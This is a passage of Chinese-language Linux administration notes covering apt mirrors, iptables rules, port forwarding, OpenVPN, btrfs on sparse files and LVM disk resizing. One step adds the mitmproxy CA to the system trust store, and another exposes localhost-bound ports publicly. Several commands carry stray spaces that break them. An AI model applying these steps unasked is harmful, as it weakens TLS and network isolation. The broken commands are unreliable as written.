exists\uff0c\u89e3\u51b3\u65b9\u6848\uff1a ip addr flush dev eth0 \u914d\u7f6eapt\u6e90\u4ee5\u52a0\u901f\u56fd\u5185\u73af\u5883\u4e0bapt\u901f\u5ea6 \u00b6 curl http://mirrors.163.com/.help/sources.list.trusty>/etc/apt/sources.list \u5982\u679c\u8fd8\u672a\u5b89\u88c5curl\uff0c\u5148\u624b\u52a8\u5199\u5165\u8fd9\u4e24\u884c\uff1a deb http://mirrors.163.com/ubuntu/ trusty main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ trusty-security main restricted universe multiverse \u6ce8\uff1avim\u590d\u5236\u4e00\u884c\u7684\u547d\u4ee4\u4e3ayy\uff0c\u7c98\u8d34\u4e3ap \u6216\u8005\u901a\u8fc7sed\u66ff\u6362\uff1a sed -i 's/security.ubuntu.com/mirrors.zju.edu.cn/g' /etc/apt/sources.list sed -i 's/archive.ubuntu.com/mirrors.zju.edu.cn/g' /etc/apt/sources.list \u5355\u7f51\u5361\u83b7\u5f97\u591a\u4e2aIP \u00b6 ifconfig eth0:233 10.xx.xx.233 netmask 255.255.255.0 up \u89e3\u51b3apt\u4f9d\u8d56\u95ee\u9898 \u00b6 \u95ee\u9898\u63cf\u8ff0\uff1a\u670d\u52a1\u5668\u4e3aubuntu14.04\u7248\u672c\uff0c\u67d0\u4e9b\u4e0d\u660e\u64cd\u4f5c\u540e\uff0c\u65e0\u6cd5\u7528 apt-get \u5b89\u88c5\u4efb\u4f55\u4e1c\u897f > apt-get -f install Reading package lists... Done Building dependency tree Reading state information... Done Correcting dependencies... failed. The following packages have unmet dependencies: libatk1.0-0 : Depends: libglib2.0-0 ( > = 2 .41.1 ) but 2 .40.0-2 is installed libglib2.0-bin : Depends: libglib2.0-0 (= 2 .44.0-1ubuntu3 ) but 2 .40.0-2 is installed libglib2.0-dev : Depends: libglib2.0-0 (= 2 .44.0-1ubuntu3 ) but 2 .40.0-2 is installed libgtk2.0-0 : Depends: libglib2.0-0 ( > = 2 .41.1 ) but 2 .40.0-2 is installed E: Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages. E: Unable to correct dependencies \u4ed4\u7ec6\u770b\u9519\u8bef\u8bf4\u660e\uff0clibglib2.0-bin\u8fd9\u4e2a\u8f6f\u4ef6\u5305\u8981\u6c42libglib2.0-0\u7684\u7248\u672c=2.44\u4f46\u662f\u73b0\u6709\u7684\u5b89\u88c5\u7248\u672c\u4e3a2.40 \u5728ubuntu\u7684\u8f6f\u4ef6\u5305\u5b98\u7f51\u641c\u7d22\u54af\uff1ahttps://launchpad.net/ubuntu/ \u53d1\u73b02.44\u7248\u672c\u7684\u662fvivid\u624d\u63d0\u4f9b\u7684\uff0c\u73b0\u5728\u7cfb\u7edf\u7248\u672c\u662ftrusty\uff0c\u81ea\u7136apt-get\u88c5\u4e0d\u4e86 \u89e3\u51b3\u65b9\u6848\uff1a \u627e\u5230\u62a5\u9519\u4fe1\u606f\u9700\u8981\u7684\u7cbe\u786e\u5339\u914d\u7684\u90a3\u4e2adeb\u6587\u4ef6\u4e0b\u8f7d\u54af\uff0c\u4f8b\u5982\u8fd9\u91cc\u5c31\u8981\u4e0b\u8f7d\u8fd9\u4e2a\u7248\u672c\u7684\uff1a https://launchpad.net/ubuntu/vivid/amd64/libglib2.0-0/2.44.0-1ubuntu3 \u5f97\u5230deb\u6587\u4ef6\u540e dpkg -i \u6587\u4ef6\u540d Note \u00b6 \u4e00\u822capt\u4f9d\u8d56\u51b2\u7a81\u95ee\u9898\u90fd\u662f\u7531\u4e8e\u7cfb\u7edf\u7248\u672c\u4e0e\u9700\u8981\u7684\u5305\u7684\u7248\u672c\u4e0d\u4e00\u81f4\u5bfc\u81f4\u7684\uff0c\u68c0\u67e5\u4e00\u4e0b/etc/apt/sources.list\u770b\u770b\u662f\u5426\u5339\u914d\u7cfb\u7edf\u7248\u672c\u54af \u7528apt-get\u524d\u68c0\u67e5\u4e00\u4e0bsources.list \u770b\u4e0e\u5f53\u524d lsb-release -a \u662f\u5426\u4e00\u81f4 UnixBench \u00b6 VPS\u6027\u80fd\u6d4b\u8bd5\u5de5\u5177\uff0c\u8017\u65f6\u8f83\u957f\uff0c\u8010\u5fc3\u7b49\u5f85 curl https://codeload.github.com/kdlucas/byte-unixbench/zip/v5.1.3>UnixBench.zip unzip UnixBench.zip cd byte-unixbench-5.1.3/UnixBench # apt-get install build-essential make screen -S ub ./Run \u53c2\u8003\u6570\u636e\uff0c\u5747\u4e3a\u6700\u4f4e\u914d\u7f6e\uff1a\u4e3b\u673a\u5c4b1590.5\uff1b\u963f\u91cc\u4e911470.4\uff1b\u817e\u8baf\u4e911156.0 \u786c\u76d8IO\u6027\u80fd\u6d4b\u8bd5 \u00b6 dd if=/dev/zero of=test bs=64k count=4k oflag=dsync dd if=/dev/zero of=test bs=8k count=256k conv=fdatasync \u6e05\u9664\u5185\u5b58\u7f13\u5b58 \u00b6 \u4f7f\u7528 free -h \u67e5\u770b\u53ef\u7528\u5185\u5b58\u524d\u53ef\u4ee5\u6267\u884c\u8fd9\u4e2a\u547d\u4ee4\uff0c\u67e5\u770b\u9664\u53bbbuffer\u540e\u7684\u53ef\u7528\u5185\u5b58 sync echo 3 > /proc/sys/vm/drop_caches \u4f7f\u7528iptables\u5c01ip \u00b6 \u5c4f\u853d\u5355\u4e2aIP \u00b6 iptables -I INPUT -s 123.45.6.7 -j DROP \u5c01C\u6bb5 \u00b6 iptables -I INPUT -s 123.45.6.0/24 -j DROP \u5c01B\u6bb5 \u00b6 iptables -I INPUT -s 123.45.0.0/16 -j DROP \u5c01A\u6bb5 \u00b6 iptables -I INPUT -s 123.0.0.0/8 -j DROP \u8bb0\u5f97 \u4fdd\u5b58 \uff1a service iptables save \u5220\u9664\u4e00\u6761\u89c4\u5219 \u00b6 \u53ea\u8981\u628a\u4e0a\u8ff0\u7684\u63d2\u5165\u89c4\u5219\u91cd\u5199\u4e00\u6b21\uff0c\u5c06\u5176\u4e2d\u7684-I\u6539\u4e3a-D\u5373\u53ef iptables -D INPUT -s IP\u5730\u5740 -j DROP \u5982\u679c\u61d2\u5f97\u91cd\u5199 \u4f60\u4e5f\u53ef\u4ee5\u5148\u5217\u4e3e\u51fa\u89c4\u5219\u6240\u5728\u7684id\uff0c\u6839\u636eid\u5220\u9664\uff1a iptables -L --line-numbers \u5047\u8bbe\u4f60\u60f3\u5220\u9664INPUT\u94fe\u7684\u7b2c3\u6761\u89c4\u5219\uff1a iptables -D INPUT 3 \u53ea\u5141\u8bb8\u7279\u5b9aIP\u8bbf\u95ee\u67d0\u7aef\u53e3 \u00b6 iptables\u7684\u63d2\u5165\u6b21\u5e8f\u5f88\u91cd\u8981\uff0c\u5148\u52a0\u5165\u7684\u4f1a\u5148\u5339\u914d\uff0c\u6240\u4ee5\u62d2\u7edd\u7b56\u7565\u5e94\u8be5\u6700\u540e\u52a0\u5165 \u4ee58888\u7aef\u53e3\u4e3a\u4f8b\uff0c\u53ea\u5141\u8bb810.77.88.99\u8fd9\u4e2aIP \u548c 10.22.33.0/24 \u8fd9\u4e2aC\u6bb5\u8bbf\u95ee\uff0c\u5176\u4ed6\u6765\u6e90\u7684\u8bbf\u95ee\u62d2\u7edd \u8fd4\u56deconnection refused iptables -A INPUT -s 10.77.88.99 -p tcp --dport 8888 -j ACCEPT iptables -A INPUT -s 10.22.33.0/24 -p tcp --dport 8888 -j ACCEPT iptables -A INPUT -p tcp --dport 8888 -j REJECT \u65e0root\u6743\u9650\u4f7f\u7528screen \u00b6 https://www.gnu.org/software/screen/ \u590d\u5236\u76f8\u540c\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u7684screen\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8fd0\u884c\u524d\u6307\u5b9a\u73af\u5883\u53d8\u91cf mkdir - p $ HOME /. screen export SCREENDIR =$ HOME /. screen screen\u7684\u7528\u6cd5 \u00b6 \u5217\u51fa\u5b58\u5728\u7684screen\uff1a screen -ls \u521b\u5efa\u4e00\u4e2a\u540d\u4e3aname\u7684screen\uff1a screen -S name \u4ecescreen\u8131\u79bb\uff1a \u6309Ctrl+A\u540e\u6309d \u91cd\u65b0\u8fde\u4e0a\u540d\u79f0\u4e3aname\u7684screen\uff1a screen -r name \u521b\u5efa\u4e00\u4e2ascreen\u7684\u81ea\u542f\u52a8\uff0c\u8ba9\u540e\u53f0\u8fdb\u7a0b\u83b7\u5f97tty # \u5047\u8bbe\u5199\u597d\u4e86\u4e00\u4e2a/root/code.sh vim /etc/rc.local # \u5728\u6700\u540e\u52a0\u5165\u4e00\u884c\uff0c\u5176\u4e2dNAME\u66ff\u6362\u4e3a\u81ea\u5df1\u559c\u6b22\u7684\u540d\u5b57 screen -dmS NAME /root/code.sh \u4e3e\u4e2a\u4f8b\u5b50\u2013\u76d1\u6d4b\u5916\u7f51\u80fd\u5426ping\u901a\uff0c\u5982\u679c\u4e0d\u80fd\u91cd\u8fdezjuvpn\uff1a code/pingtest.sh \u53cc\u7f51\u5361\u7aef\u53e3\u8f6c\u53d1\uff0c\u66b4\u9732\u5185\u7f51\u7aef\u53e3 \u00b6 @TAG \u7aef\u53e3\u8f6c\u53d1 \u6765\u81ea\uff1a https://yq.aliyun.com/wenzhang/show_25824 \u6709\u4e24\u53f0\u673a\u5668\uff0c\u5176\u4e2d\u4e00\u53f0A \u6709\u5185\u7f51\u548c\u5916\u7f51\uff0cB\u53ea\u6709\u5185\u7f51\u3002 \u76ee\u6807\uff1a \u5728\u5916\u7f51\u8bbf\u95eeA\u673a\u5668\u76842121\u7aef\u53e3\uff0c\u5c31\u76f8\u5f53\u4e8e\u8fde\u4e0a\u4e86B\u673a\u5668\u7684ftp(21) \u73af\u5883\uff1a \u00b6 A\u673a\u5668\u5916\u7f51IP\u4e3a 1.2.3.4(eth1) \u5185\u7f51IP\u4e3a 192.168.1.20 (eth0) B\u673a\u5668\u5185\u7f51\u4e3a 192.168.1.21 \u5b9e\u73b0\u65b9\u6cd5\uff1a \u00b6 \u9996\u5148\u5728A\u673a\u5668\u4e0a\u6253\u5f00\u7aef\u53e3\u8f6c\u53d1\u529f\u80fd echo 1 > /proc/sys/net/ipv4/ip_forward echo -e \"\\nnet.ipv4.ip_forward = 1\">>/etc/sysctl.conf sysctl -p \u7136\u540e\u5728A\u673a\u5668\u4e0a\u521b\u5efaiptables\u89c4\u5219 # \u628a\u8bbf\u95ee\u5916\u7f51 2121 \u7aef\u53e3\u7684\u5305\u8f6c\u53d1\u5230\u5185\u7f51 ftp\u670d\u52a1\u5668 iptables - t nat - I PREROUTING - d 1 . 2 . 3 . 4 - p tcp --dport 2121 -j DNAT --to 192.168.1.21:21 # \u628a\u5230\u5185\u7f51 ftp\u670d\u52a1\u5668\u7684\u5305\u56de\u6e90\u5230\u5185\u7f51\u7f51\u5361\u4e0a \uff0c\u4e0d\u7136\u5305\u53ea\u80fd\u8f6c\u5230 ftp\u670d\u52a1\u5668 \uff0c\u800c\u8fd4\u56de\u7684\u5305\u4e0d\u80fd\u5230\u8fbe\u5ba2\u6237\u7aef iptables - t nat - I POSTROUTING - d 192 . 168 . 1 . 21 - p tcp --dport 21 -j SNAT --to 192.168.1.20 # \u4fdd\u5b58\u4e00\u4e0b\u89c4\u5219 service iptables save \u53d6\u6d88\u8f6c\u53d1\u65b9\u6cd5 \u00b6 iptables\u4e2d\u628a-I\u6539\u4e3a-D\u8fd0\u884c\u5c31\u662f\u5220\u9664\u6b64\u6761\u89c4\u5219 \u4fdd\u62a4\u91cd\u8981\u7cfb\u7edf\u6587\u4ef6\u9632\u6b62\u88ab\u5220 \u00b6 \u4f7f\u7528+i\u6807\u5fd7\u4f4d\u4f7f\u5f97root\u7528\u6237\u4e5f\u4e0d\u80fd\u5220\u9664/bin, /sbin, /usr/sbin, /usr/bin, /usr/local/sbin, /usr/local/bin chattr -R +i /bin /sbin /usr/sbin /usr/bin /usr/local/sbin /usr/local/bin \u8bbe\u7f6e\u540e\u65e0\u6cd5apt-get\u5b89\u88c5\u65b0\u8f6f\u4ef6\uff0c\u9700\u8981\u5148\u53d6\u6d88\u6807\u5fd7\u4f4d chattr -R -i /bin /sbin /usr/sbin /usr/bin /usr/local/sbin /usr/local/bin \u67e5\u770bCPU\u6838\u5fc3\u4e2a\u6570 \u00b6 \u4e00\u822c\u6211\u4f1a\u7528 top \u547d\u4ee4\uff0c\u6309 1 \u5c31\u80fd\u770b\u5230\u6bcf\u4e2aCPU\u5360\u7528\u60c5\u51b5 \u4f46\u5f53CPU\u592a\u591a\u7684\u65f6\u5019\u8fd8\u662f\u9700\u8981\u6267\u884c\u547d\u4ee4\u7684\uff1a # \u67e5\u770b\u7269\u7406 CPU\u4e2a\u6570 cat / proc / cpuinfo | grep \"physical id\" | sort | uniq | wc - l # \u67e5\u770b\u6bcf\u4e2a\u7269\u7406 CPU\u4e2dcore\u7684\u4e2a\u6570 ( \u5373\u6838\u6570 ) cat / proc / cpuinfo | grep \"cpu cores\" | uniq # \u67e5\u770b\u903b\u8f91 CPU\u7684\u4e2a\u6570 cat / proc / cpuinfo | grep \"processor\" | wc - l \u975e\u4ea4\u4e92\u5f0f\u6dfb\u52a0\u7528\u6237 \u00b6 useradd username -m echo username:badpassword|chpasswd \u6dfb\u52a0\u4e00\u4e2a\u7528\u6237\u540d\u4e3ausername\u7684\u7528\u6237\u5e76\u521b\u5efahome\u76ee\u5f55\uff0c\u5e76\u8bbe\u7f6e\u5bc6\u7801\u4e3abadpassword \u7b80\u5355OpenVPN\u914d\u7f6e \u00b6 \u4e00\u4e2a\u6700\u6700\u7b80\u5355\u7684\u573a\u666f\uff1a\u53ea\u6709\u4e00\u4e2a\u670d\u52a1\u5668 \u4e00\u4e2a\u5ba2\u6237\u7aef\uff0c\u5728\u5bb9\u5668\u4e2d\u7528\u6765\u7ed9\u7528\u6237\u76f4\u63a5\u8bbf\u95ee\u7684\u4e00\u4e2a\u5185\u7f51IP \u53c2\u8003\uff1a https://openvpn.net/index.php/open-source/documentation/miscellaneous/78-static-key-mini-howto.html \u5b89\u88c5openvpn: \u00b6 Linux: apt-get install openvpn Windows: openvpn.exe \u751f\u6210\u5bc6\u94a5 \u00b6 openvpn --genkey --secret static.key \u7528\u53e6\u5916\u5efa\u7acb\u7684\u5b89\u5168\u901a\u9053(SSH)\u5c06static.key\u53d1\u7ed9\u5ba2\u6237\u7aef \u670d\u52a1\u7aef\u914d\u7f6e \u00b6 ifconfig 10 . 8 . 0 . 1 10 . 8 . 0 . 2 secret / static . key keepalive 10 60 persist - key persist - tun proto udp port 1194 dev tun0 status / tmp / openvpn - status . log user nobody group nogroup \u5728 Ubuntu \u4e2d\uff0c\u5982\u679c\u8981\u914d\u7f6e\u6210\u7cfb\u7edf\u670d\u52a1\u7684\u5f62\u5f0f\uff0c\u5c06\u5176\u4fdd\u5b58\u5230/etc/openvpn/myvpn.conf \u7136\u540e\u8fd9\u6837\u542f\u52a8\u5b83\uff1a service openvpn@myvpn start \u8fd9\u6837\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f systemctl enable openvpn@myvpn.service \u5ba2\u6237\u7aef\u914d\u7f6e \u00b6 remote \u8fd9\u91cc\u662f\u4f60\u7684\u670d\u52a1\u5668IP \u8fd9\u91cc\u662f\u4f60\u7684\u670d\u52a1\u5668\u7aef\u53e3 udp dev tun ifconfig 10.8.0.2 10.8.0.1 secret static.key \u5728Docker\u4e2d\u4f7f\u7528\u670d\u52a1\u7aef \u00b6 \u53c2\u8003\uff1a https://raw.githubusercontent.com/kylemanna/docker-openvpn/master/bin/ovpn_run \u8fd0\u884c\u5bb9\u5668\u7684\u65f6\u5019\u4e00\u5b9a\u8981\u7ed9\u53c2\u6570 --cap-add=NET_ADMIN \u53e6\u5916\u8fd8\u9700\u8981\u5728\u5bb9\u5668\u4e2d\u6267\u884c\uff1a mkdir -p /dev/net if [ ! -c /dev/net/tun ]; then mknod /dev/net/tun c 10 200 fi \u65f6\u533a\u65f6\u95f4\u8bbe\u7f6e \u00b6 \u53c2\u8003\uff1a http://liumissyou.blog.51cto.com/4828343/1302050 \u8bbe\u7f6e\u4e3a\u4e0a\u6d77\u65f6\u533a UTC+8 apt-get install tzdata cp /etc/localtime /etc/localtime.bak ln -svf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime echo \"TZ='Asia/Shanghai'\">>~/.bashrc ntpdate cn.pool.ntp.org \u4fee\u6539\u65f6\u95f4\u53ef\u4ee5\u7528\uff1a date -s \"2017-06-18 16:40:00\" \u5feb\u901f\u5730\u683c\u5f0f\u5316\u5927\u5206\u533aext4 \u00b6 Linux\u7cfb\u7edf\u5efa\u8bae\u4f7f\u7528ext4\u5206\u533a\u683c\u5f0f\uff0c\u4f46\u76f4\u63a5mkfs.ext4 /dev/sda1\u5c31\u6709\u5f88\u5927\u7684\u5751\uff1a\u4f1a\u9ed8\u8ba4lazyinit\u5728\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u5185\u5360\u7528IO \u53c2\u8003\uff1a http://fibrevillage.com/storage/474-ext4-lazy-init \u9002\u7528\u4e8e\u5b58\u50a8\u5c11\u91cf\u5927\u6587\u4ef6\u7684\u683c\u5f0f\u5316\u5927\u786c\u76d8\u7684\u65b9\u6cd5\u5982\u4e0b\uff0c\u8fd9\u6837\u4e0d\u4f1a\u8df3\u8fc7\u521d\u59cb\u5316\u78c1\u76d8\u7684\u8fc7\u7a0b\u800c\u4e14\u521d\u59cb\u5316\u8fc7\u7a0b\u5f88\u5feb\uff1a mkfs.ext4 /dev/sdXX -E lazy_itable_init=0,lazy_journal_init=0 -O sparse_super,large_file -m 0 -T largefile4 \u5bf9\u5e94\u7684 man\u6587\u6863 \u6dfb\u52a0\u53d7\u4fe1\u4efb\u7684CA\u8bc1\u4e66 mitmproxy \u00b6 @TAG mitm cat ~/.mitmproxy/mitmproxy-ca-cert.pem >> /etc/ssl/certs/ca-certificates.crt \u660e\u660e\u8fd8\u6709\u5927\u91cf\u7a7a\u95f4\u5374\u8bf4\u6ca1\u6709\uff1finode\u6ee1\u4e86\uff01\u6302\u8f7d\u5355\u4e2a\u6587\u4ef6\u4e3abtrfs\u5206\u533a \u00b6 \u95ee\u9898\u73b0\u8c61 \u00b6 df -h \u663e\u793a\u8fd8\u6709\u5f88\u591a\u7a7a\u95f4\uff0c\u4f46 echo test>test.txt \u4f1a\u663e\u793a No space left on device \u67e5\u5230\u8fd9\u4e2a\uff1a https://wiki.gentoo.org/wiki/Knowledge_Base:No_space_left_on_device_while_there_is_plenty_of_space_available \u4f7f\u7528 df -i \u67e5\u770binodes\u5360\u7528\u60c5\u51b5\uff0c\u53d1\u73b0\u786e\u5b9e100%\u4e86 \u89e3\u51b3\u65b9\u6848 \u00b6 inodes\u4e0a\u9650\u5728mkfs\u65f6\u5c31\u5b9a\u4e0b\u6765\u4e86\uff0c\u4e0d\u80fd\u6539\u52a8\uff0c\u6240\u4ee5\u6ca1\u6551\u4e86\u3002\u3002\u3002 \u771f\u6ca1\u6551\u4e86\u561b\uff1f \u5f53\u7136\u4e0d\u662f\uff0c\u867d\u7136\u4e0d\u80fd\u5199\u5165\u5927\u91cf\u5c0f\u6587\u4ef6\uff0c\u4f46\u8fd8\u662f\u53ef\u4ee5\u5199\u4e00\u4e2a\u5927\u6587\u4ef6\u7684\u561b\uff0c\u5c31\u60f3\u5230\u6302\u8f7d\u5355\u4e2a\u6587\u4ef6\u4e3abtrfs\u5206\u533a 1. \u5220\u6587\u4ef6 \u817e\u51fa\u90e8\u5206inodes \u00b6 \u5220\u6389\u4e00\u4e9b\u4e0d\u7528\u7684\u5c0f\u6587\u4ef6\uff0c\u4e5f\u4e0d\u7528\u5220\u592a\u591a 2. \u521b\u5efa\u4e00\u4e2a1TB\u7684sparse file \u00b6 \u53c2\u8003: https://prefetch.net/blog/2009/07/05/creating-sparse-files-on-linux-hosts-with-dd/ \u4f7f\u7528dd\u547d\u4ee4\uff0c\u4e0d\u5c06\u5b9e\u9645\u5185\u5bb9\u5199\u5165\u786c\u76d8\uff0c\u80fd\u5f88\u5feb\u6267\u884c\u5b8c\u6210\uff1a NAME=\"filesystem\" dd if=/dev/zero of= ${ NAME } .img bs=1 count=0 seek=1T \u6267\u884c\u540els -alh\u80fd\u770b\u5230\u6587\u4ef6\u5927\u5c0f\u4e3a1T\uff0c\u4f7f\u7528 du filesystem.img \u67e5\u770b\u771f\u5b9e\u7a7a\u95f4 3. \u521b\u5efa\u78c1\u76d8\u5206\u533a \u00b6 \u53c2\u8003\uff1a https://www.jamescoyle.net/how-to/2096-use-a-file-as-a-linux-block-device btrfs\u53c2\u8003\uff1a https://btrfs.wiki.kernel.org/index.php/Getting_started mkfs.btrfs ${ NAME } .img 4. \u6302\u8f7d\u5206\u533a \u00b6 mount ${ NAME } .img /mnt 5. \u7136\u540e\u5c31\u53ef\u4ee5\u642c\u8fd0\u6570\u636e\u8fc7\u53bb\u4e86 \u00b6 \u5c31\u7528mv\u50cf\u5f80\u5e38\u4e00\u6837\u642c\u54af \u4e00\u4e9b\u67e5\u770b\u7a7a\u95f4\u7684\u547d\u4ee4 \u00b6 # \u67e5\u770b\u78c1\u76d8\u6587\u4ef6\u5360\u7528\u7a7a\u95f4 du -h filesystem.img # \u67e5\u770bbtrfs\u5143\u6570\u636e\u5360\u7528\u7a7a\u95f4 btrfs filesystem df /mnt # \u4e5f\u662f\u67e5\u770b\u7a7a\u95f4 btrfs filesystem usage /mnt 6. \u5378\u8f7d\u8bbe\u5907 \u00b6 sudo umount /mnt sudo losetup -d /dev/loop0 \u6269\u5bb9\u4e0a\u8ff0\u5355\u6587\u4ef6btrfs\u78c1\u76d8 \u00b6 @TAG \u5b89\u5168\u6700\u4f73\u5b9e\u8df5 \u968f\u7740\u4e0d\u505c\u5730\u5199\u5165\u6570\u636e\uff0c\u4e0a\u9762\u521b\u5efa\u76841TB\u5206\u533a\u5c31\u8981\u88ab\u5199\u6ee1\u4e86\uff01\u4f46\u6587\u4ef6\u6240\u5728\u7269\u7406\u78c1\u76d8\u8fd8\u6709\u7a7a\u95f4\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u7ed9btrfs\u78c1\u76d8\u6269\u5bb9\uff1a \u5b9e\u9645\u6587\u4ef6\u7528truncate\u589e\u52a0\u4e00\u4e2ahole\uff1blosetup\u66f4\u65b0loop0\u7684\u5927\u5c0f\uff1b\u4f7f\u7528btrfs\u547d\u4ee4\u7ed9\u5206\u533a\u6269\u5bb9 truncate\u662f\u4e00\u4e2a\u5371\u9669\u7684\u547d\u4ee4\uff0c\u4e3a\u4e86\u907f\u514d\u624b\u6296\u628a\u7a7a\u95f4\u5199\u5c0f\u4e86\u4e22\u5931\u6570\u636e\uff0c\u8fd9\u91cc\u7528 --reference \u53c2\u6570\u6307\u5b9a\u4e00\u4e2a\u76ee\u6807\u5927\u5c0f\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u6211\u4eec\u60f3\u6269\u5bb9\u52301.5T=1536GB dd if =/ dev / zero of = temp bs = 1 count = 0 seek = 1536 G ls - alh # \u786e\u8ba4\u6587\u4ef6\u5927\u5c0f truncate - r temp filesystem . img # \u5047\u8bbe\u76ee\u524d\u4f7f\u7528\u7684\u662f / dev / loop0 # \u4f60\u53ef\u4ee5\u8fd9\u6837\u786e\u8ba4 loop0\u786e\u5b9e\u662ffilesystem . img\u6302\u8f7d\u7684 \uff1a losetup --list /dev/loop0 losetup - c / dev / loop0 # \u786e\u4fdd\u76ee\u524d btrfs\u5206\u533a\u662f\u6302\u8f7d\u7740\u7684 \uff0c btrfs\u5fc5\u987b\u5148mount\u624d\u80fdresize # mount filesystem . img / mnt btrfs filesystem resize + 500 G / mnt \u53c2\u8003\uff1a https://linux.die.net/man/1/truncate https://askubuntu.com/questions/260620/resize-dev-loop0-and-increase-space https://btrfs.wiki.kernel.org/index.php/UseCases#How_do_I_resize_a_partition.3F_.28shrink.2Fgrow.29 \u5b89\u5168\u5730\u62d4\u51fa\u79fb\u52a8\u786c\u76d8 \u00b6 \u9996\u5148\u5f53\u7136\u662f sudo umount /mnt \u5378\u8f7d\u6302\u8f7d\u70b9\u54af\uff0c\u5982\u4f55\u66f4\u5b89\u5168\u4e00\u70b9\u5462\uff1f udisksctl power-off -b /dev/sdb From: https://unix.stackexchange.com/questions/354138/safest-way-to-remove-usb-drive-on-linux iptables \u8ba9\u76d1\u542c\u5728127.0.0.1\u4e0a\u7684\u7aef\u53e3\u53ef\u4ee5\u516c\u7f51\u8bbf\u95ee \u00b6 \u53c2\u8003\uff1a https://unix.stackexchange.com/questions/111433/iptables-redirect-outside-requests-to-127-0-0-1 \u4f8b\u5982\u6709\u76d1\u542c\u5728127.0.0.1:1234\u7684\u5e94\u7528\uff0c\u73b0\u5728\u60f3\u901a\u8fc7ip:5678\u6765\u8bbf\u95ee iptables -t nat -I PREROUTING -p tcp --dport 5678 -j DNAT --to-destination 127.0.0.1:1234 sysctl -w net.ipv4.conf.eth0.route_localnet=1 VMWare\u6269\u5bb9\u78c1\u76d8 LVM\u5728\u7ebf\u6269\u5bb9 \u00b6 @TAG \u865a\u62df\u673a \u53c2\u8003\uff1a https://ma.ttias.be/increase-a-vmware-disk-size-vmdk-formatted-as-linux-lvm-without-rebooting/ https://ubuntuforums.org/showthread.php?t=2277232 \u4fee\u590d GPT PMBR size mismatch \u7528 parted -l \u8f93\u5165Fix\u5373\u53ef\uff0c\u65e0\u9700live cd root @docker : / d # parted - l Warning : Not all of the space available to / dev / sda appears to be used , you can fix the GPT to use all of the space ( an extra 314572800 blocks ) or continue with the current setting ? Fix / Ignore ? Fix Model : VMware Virtual disk ( scsi ) Disk / dev / sda : 215 GB Sector size ( logical / physical ) : 512 B / 512 B Partition Table : gpt Disk Flags : Number Start End Size File system Name Flags 1 1049 kB 2097 kB 1049 kB bios_grub 2 2097 kB 1076 MB 1074 MB ext4 3 1076 MB 53.7 GB 52.6 GB Model : Linux device - mapper ( linear ) ( dm ) Disk / dev / mapper / ubuntu -- vg - ubuntu -- lv : 52.6 GB Sector size ( logical / physical ) : 512 B / 512 B Partition Table : loop Disk Flags : Number Start End Size File system Flags 1 0.00 B 52.6 GB 52.6 GB ext4 Warning : Unable to open / dev / sr0 read - write ( Read - only file system ). / dev / sr0 has been opened read - only . Model : NECVMWar VMware SATA CD00 ( scsi ) Disk / dev / sr0 : 875 MB Sector size ( logical / physical ) : 2048 B / 2048 B Partition Table : mac Disk Flags : Number Start End Size File system Name Flags 1 2048 B 6143 B 4096 B Apple 2 659 MB 662 MB 2523 kB EFI root @docker : / d # fdisk - l Disk / dev / loop0 : 91 MiB , 95408128 bytes , 186344 sectors Units : sectors of 1 * 512 = 512 bytes Sector size ( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes Disk / dev / sda : 200 GiB , 214748364800 bytes , 419430400 sectors Units : sectors of 1 * 512 = 512 bytes Sector size ( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes Disklabel type : gpt Disk identifier : C6597B3B - 17 F0 - 482 A - AF5D - 6056 F7788052 Device Start End Sectors Size Type / dev / sda1 2048 4095 2048 1 M BIOS boot / dev / sda2 4096 2101247 2097152 1 G Linux filesystem / dev / sda3 2101248 104855551 102754304 49 G Linux filesystem Disk / dev / mapper / ubuntu -- vg - ubuntu -- lv : 49 GiB , 52609155072 bytes , 102752256 sectors Units : sectors of 1 * 512 = 512 bytes Sector size ( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes root @docker : / d # fdisk / dev / sda Welcome to fdisk ( util - linux 2.31.1 ). Changes will remain in memory only , until you decide to write them . Be careful before using the write command . Command ( m for help ) : n Partition number ( 4 - 128 , default 4 ) : First sector ( 104855552 - 419430366 , default 104855552 ) : Last sector , + sectors or + size { K , M , G , T , P } ( 104855552 - 419430366 , default 419430366 ) : Created a new partition 4 of type 'Linux filesystem' and of size 150 GiB . Command ( m for help ) : t Partition number ( 1 - 4 , default 4 ) : 4 Partition type ( type L to list all types ) : 8 e Type of partition 4 is unchanged : Linux filesystem . Command ( m for help ) : w The partition table has been altered . Syncing disks . root @docker : / d # partprobe - s / dev / sda : gpt partitions 1 2 3 4 / dev / mapper / ubuntu -- vg - ubuntu -- lv : loop partitions 1 Warning : Unable to open / dev / sr0 read - write ( Read - only file system ). / dev / sr0 has been opened read - only . Warning : Unable to open / dev / sr0 read - write ( Read - only file system ). / dev / sr0 has been opened read - only . Warning : Unable to open / dev / sr0 read - write ( Read - only file system ). / dev / sr0 has been opened read - only . / dev / sr0 : mac partitions 1 2 root @docker : / d # fdisk - l Disk / dev / loop0 : 91 MiB , 95408128 bytes , 186344 sectors Units : sectors of 1 * 512 = 512 bytes Sector size ( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes Disk / dev / sda : 200 GiB , 214748364800 bytes , 419430400 sectors Units : sectors of 1 * 512 = 512 bytes Sector size ( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes Disklabel type : gpt Disk identifier : C6597B3B - 17 F0 - 482 A - AF5D - 6056 F7788052 Device Start End Sectors Size Type / dev / sda1 2048 4095 2048 1 M BIOS boot / dev / sda2 4096 2101247 2097152 1 G Linux filesystem / dev / sda3 2101248 104855551 102754304 49 G Linux filesystem / dev / sda4 104855552 419430366 314574815 150 G Linux filesystem Disk / dev / mapper / ubuntu -- vg - ubuntu -- lv : 49 GiB , 52609155072 bytes , 102752256 sectors Units : sectors of 1 * 512 = 512 bytes Sector size 